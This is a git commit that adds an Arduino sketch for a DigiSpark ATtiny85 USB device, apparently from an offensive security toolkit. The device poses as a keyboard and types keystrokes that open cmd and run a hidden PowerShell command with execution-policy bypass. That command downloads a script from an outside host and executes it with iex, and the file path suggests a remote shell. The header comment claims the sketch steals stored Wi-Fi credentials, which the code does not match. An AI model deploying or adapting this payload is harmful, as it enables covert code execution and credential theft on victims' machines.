e710716a3761b1e8effe710980e1b5a24da7b628
Panagiotis Chartas <t3l3machus@protonmail.com>
2023-06-03 22:12:17 +0200

    Create http_iex_powershell.ino

---
+++ ATtiny85_templates/http_iex_powershell.ino
@@ -0,0 +1,22 @@
+//This script grabs all stored wireless network credentials and forwards them via http(s) 
+//to an attacker controlled server (created to work best with Synergy-Httpx as the receiver).  
+//I edited a template from https://github.com/CedArctic/DigiSpark-Scripts/ to make this.
+
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2300);
+  DigiKeyboard.print(F("powershell -NoP -W Hidden -ep Bypass \"irm -Uri https://t3l3machus.com/rshell:443 | iex\""));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  //DigiKeyboard.print("exit");
+  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for(;;){ }
+}
